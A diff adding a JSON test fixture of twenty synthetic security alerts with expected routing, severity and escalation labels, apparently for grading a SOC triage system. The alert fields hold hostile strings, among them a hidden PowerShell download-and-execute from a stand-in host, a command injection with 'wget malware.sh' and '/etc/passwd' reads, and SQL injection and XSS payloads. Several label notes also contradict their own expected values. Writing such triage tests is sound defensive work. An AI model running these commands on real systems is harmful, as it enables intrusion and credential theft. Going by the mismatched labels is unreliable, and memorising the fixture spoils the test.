@@ -1,0 +1,218 @@
+[
+  {
+    "alert": "CEF:0|Palo Alto Networks|PAN-OS|10.2.1|traffic-deny|Deny Traffic|6|src=192.168.1.45 dst=10.0.0.5 dpt=443 spt=51234 proto=tcp act=dropped",
+    "expected_routing": "network",
+    "expected_severity": "low",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker"
+    ],
+    "label_notes": "Routine firewall traffic denial with internal source and destination requires standard enrichment only."
+  },
+  {
+    "alert": "{\"timestamp\":\"2024-01-15T14:23:45Z\",\"source\":\"EDR\",\"hostname\":\"WORKSTATION-07\",\"event_type\":\"process_execution\",\"user\":\"domain\\\\jsmith\",\"process_name\":\"powershell.exe\",\"process_id\":4521,\"command_line\":\"powershell.exe -NoProfile -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')\",\"hash_md5\":\"5d41402abc4b2a76b9719d911017c592\"}",
+    "expected_routing": "malware",
+    "expected_severity": "critical",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Hidden PowerShell execution downloading remote payload is clear malware execution requiring immediate escalation and campaign analysis."
+  },
+  {
+    "alert": "<134>Jan 15 09:47:22 fw-core01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=203.0.113.77 DST=192.168.1.100 PROTO=TCP SPT=45678 DPT=22 WINDOW=65535 FLAGS=SYN URGP=0",
+    "expected_routing": "network",
+    "expected_severity": "low",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker"
+    ],
+    "label_notes": "Blocked SSH connection attempt from external IP warrants medium severity and enrichment to determine threat context."
+  },
+  {
+    "alert": "{\"event_id\":\"WAF-2024-001847\",\"timestamp\":\"2024-01-15T14:25:33Z\",\"rule_name\":\"SQL_Injection_Detection\",\"source_ip\":\"198.51.100.42\",\"destination\":\"api.company.com\",\"http_method\":\"POST\",\"uri\":\"/login\",\"payload\":\"admin' OR '1'='1\",\"action\":\"blocked\",\"http_status\":403}",
+    "expected_routing": "other",
+    "expected_severity": "medium",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker"
+    ],
+    "label_notes": "SQL injection attempt successfully blocked by WAF requires enrichment to identify attacker source and patterns."
+  },
+  {
+    "alert": "TIMESTAMP=2024-01-15 14:26:01|SOURCE_IP=172.16.0.88|EVENT_TYPE=FAILED_LOGIN|USERNAME=alopez|ATTEMPT_COUNT=5|AUTHENTICATION_METHOD=LDAP|STATUS=account_locked",
+    "expected_routing": "identity_auth",
+    "expected_severity": "medium",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "itdr_specialist"
+    ],
+    "label_notes": "Account locked after failed login attempts requires identity specialist to determine if account compromise or legitimate lockout."
+  },
+  {
+    "alert": "CEF:0|CrowdStrike|Falcon|7.11.0|malware-detection|Malware Detected|9|suser=mchen src=10.20.30.40 fname=trojan.exe fhash=e99a18c428cb38d5f260853678922e03 severity=high",
+    "expected_routing": "malware",
+    "expected_severity": "high",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "High-severity trojan detection requires immediate escalation and campaign investigation to identify scope."
+  },
+  {
+    "alert": "[2024-01-15 14:27:15] ALERT | SIEM-RULE-4521 | Host: SERVER-DB-02 | Event: Suspicious Registry Modification | User: SYSTEM | Registry Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | New Value: \"C:\\Windows\\System32\\svchost.exe\" | Source: EDR",
+    "expected_routing": "malware",
+    "expected_severity": "critical",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Suspicious Run registry modification on database server by SYSTEM is persistence technique requiring immediate escalation."
+  },
+  {
+    "alert": "{\"alert_id\":\"CF-92847\",\"timestamp\":\"2024-01-15T14:28:44Z\",\"severity\":\"critical\",\"source\":\"WAF\",\"rule_type\":\"XSS_Attack\",\"destination_host\":\"shop.example.com\",\"client_ip\":\"185.220.101.45\",\"request_path\":\"/product\",\"parameter\":\"search\",\"payload\":\"<script>alert('XSS')</script>\",\"action\":\"quarantine\"}",
+    "expected_routing": "other",
+    "expected_severity": "low",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "XSS attack on e-commerce platform quarantined requires escalation to investigate potential account takeover or data theft campaign."
+  },
+  {
+    "alert": "src_ip=203.0.113.129 dst_ip=10.50.60.70 src_port=49821 dst_port=3389 protocol=TCP action=denied reason=geofence_violation country=KP timestamp=2024-01-15T14:29:12Z firewall=checkpoint-fw02",
+    "expected_routing": "network",
+    "expected_severity": "medium",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker"
+    ],
+    "label_notes": "RDP connection from sanctioned country (North Korea) violates geofence policy and requires immediate escalation."
+  },
+  {
+    "alert": "{\"type\":\"process_termination\",\"timestamp\":\"2024-01-15T14:30:05Z\",\"endpoint\":\"DESKTOP-KRAMER\",\"user\":\"domain\\\\dcosta\",\"process_name\":\"svchost.exe\",\"process_id\":3847,\"parent_process\":\"services.exe\",\"action\":\"terminated_by_edr\",\"reason\":\"behavioral_threat_detected\",\"severity\":\"high\"}",
+    "expected_routing": "malware",
+    "expected_severity": "high",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "EDR terminated svchost with behavioral threat requires immediate escalation to determine malware family and campaign scope."
+  },
+  {
+    "alert": "CEF:0|F5|ASM|13.1.0|application-attack|Application Attack Detected|8|src=192.0.2.150 dst=203.0.113.200 dpt=8443 attack_type=path_traversal request_url=/admin/../../etc/passwd severity=medium",
+    "expected_routing": "other",
+    "expected_severity": "medium",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker"
+    ],
+    "label_notes": "Path traversal attack attempt blocked requires enrichment to assess attacker sophistication and source."
+  },
+  {
+    "alert": "<165>2024-01-15T14:31:22Z siem-collector01 AUTHENTICATION_FAILED: username=rthompson src_ip=198.51.100.88 authentication_method=kerberos failure_reason=invalid_credentials attempt=3 timestamp_utc=1705337482",
+    "expected_routing": "identity_auth",
+    "expected_severity": "low",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "itdr_specialist"
+    ],
+    "label_notes": "Isolated Kerberos authentication failures require identity specialist to determine if user error or targeted attack attempt."
+  },
+  {
+    "alert": "{\"event\":\"file_access_denied\",\"timestamp\":\"2024-01-15T14:32:10Z\",\"source\":\"EDR\",\"host\":\"LAPTOP-JENKINS\",\"user\":\"erodriguez\",\"file_path\":\"C:\\\\Users\\\\Administrator\\\\AppData\\\\Roaming\\\\sensitive_data.xlsx\",\"access_type\":\"read\",\"file_hash_sha256\":\"9f86d081884c7d6d9ffd60bb2c457f321344e6b5cd1dd12065ab850a0bc3c1d3\",\"block_reason\":\"data_exfiltration_prevention\"}",
+    "expected_routing": "other",
+    "expected_severity": "high",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Attempted access to sensitive admin files by non-admin user blocked by DLP requires escalation for insider threat investigation."
+  },
+  {
+    "alert": "alert_timestamp=2024-01-15 14:33:45|alert_id=FW-RULE-7834|rule_name=Botnet_C2_Communication|source_ip=10.100.50.25|destination_ip=91.199.77.122|destination_port=8080|protocol=TCP|domain_queried=malware.botnet.ru|domain_queried=malware.botnet.ru|action=blocked|confidence_score=0.98",
+    "expected_routing": "malware",
+    "expected_severity": "critical",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Botnet C2 communication with 98% confidence requires immediate escalation and full campaign investigation."
+  },
+  {
+    "alert": "CEF:0|Fortinet|FortiGate|7.2.4|dlp-violation|Data Loss Prevention Alert|7|src=172.31.0.45 duser=bwilson dst=external_email_server file_name=financial_report_2024.xlsx file_hash=a3c8e7f2d1c6b9a4e5f8g7h3i2j1k0l9 severity=critical",
+    "expected_routing": "other",
+    "expected_severity": "critical",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Financial document exfiltration attempt by named user requires immediate escalation for insider threat or account compromise investigation."
+  },
+  {
+    "alert": "{\"detection_id\":\"EDR-20240115-884721\",\"timestamp\":\"2024-01-15T14:34:58Z\",\"event_type\":\"registry_query\",\"endpoint\":\"SERVER-APP-03\",\"username\":\"svc_account\",\"registry_key\":\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\\",\"action\":\"blocked\",\"malware_family\":\"trojan.Generic\",\"confidence\":\"94%\",\"source\":\"Windows Defender\"}",
+    "expected_routing": "malware",
+    "expected_severity": "high",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Generic trojan detected on application server with 94% confidence requires immediate escalation for containment and campaign analysis."
+  },
+  {
+    "alert": "SRC=198.51.100.67 DST=203.0.113.88 SPORT=60912 DPORT=443 ACTION=DROP REASON=threat_intelligence_match THREAT_ID=TI-001834 SEVERITY=high TIMESTAMP=2024-01-15T14:36:02Z IPS_ENGINE=suricata",
+    "expected_routing": "network",
+    "expected_severity": "medium",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "HTTPS connection from threat intelligence flagged IP requires escalation to determine if targeted reconnaissance or attack."
+  },
+  {
+    "alert": "{\"alert_type\":\"command_injection\",\"timestamp\":\"2024-01-15T14:37:19Z\",\"waf_instance\":\"WAF-PROD-02\",\"source_ip\":\"192.0.2.201\",\"target_url\":\"https://api.service.io/admin/execute\",\"http_method\":\"GET\",\"parameter_name\":\"cmd\",\"parameter_value\":\"cat /etc/passwd; wget malware.sh\",\"detection_engine\":\"signature_based\",\"action\":\"denied\"}",
+    "expected_routing": "other",
+    "expected_severity": "medium",
+    "expected_escalation": false,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Command injection attempt on admin API downloading malware requires immediate escalation for threat hunt and campaign analysis."
+  },
+  {
+    "alert": "user_id=mgarcia source_ip=10.75.30.15 destination_ip=8.8.8.8 destination_port=53 protocol=DNS query_domain=suspicious-c2-domain.xyz query_type=A record_timestamp=2024-01-15T14:38:33Z event_status=suspicious security_tool=DNS_sinkhole",
+    "expected_routing": "malware",
+    "expected_severity": "high",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "DNS query to known C2 domain by user device requires immediate escalation for malware investigation and lateral movement assessment."
+  },
+  {
+    "alert": "CEF:0|Rapid7|InsightIDR|6.9.2|suspicious-account-activity|Account Anomaly Detected|6|suser=jlee src=203.0.113.156 event_type=impossible_travel previous_location=New York current_location=Tokyo time_diff_minutes=127 severity=high",
+    "expected_routing": "identity_auth",
+    "expected_severity": "high",
+    "expected_escalation": true,
+    "expected_workers_contains": [
+      "enrichment_worker",
+      "itdr_specialist",
+      "soc_analyst_worker"
+    ],
+    "label_notes": "Impossible travel anomaly with account authentication warrants identity specialist review and escalation for account compromise investigation."
+  }
+]
